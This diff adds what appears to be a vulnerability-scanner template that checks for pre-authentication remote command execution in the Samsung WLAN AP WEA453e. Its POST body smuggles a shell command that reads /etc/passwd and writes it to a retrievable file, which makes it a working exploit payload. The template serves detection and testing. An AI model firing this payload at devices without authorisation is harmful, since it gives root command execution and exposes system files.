@@ -1,0 +1,25 @@
+id: samsung-wlan-ap-rce
+name: Samsung WLAN AP WEA453e - Remote Code Execution
+severity: critical
+confidence: tentative
+description: Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means
+  an attacker could run code as root remotely without logging in.
+reference: CWE-77
+tags:
+- xss
+- samsung
+- rce
+- vuln
+requests:
+- method: POST
+  path: /(download)/tmp/poc.txt
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+    - bin:.*:1:1
+  - type: status
+    status:
+    - 200
+  condition: and
+  body: command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
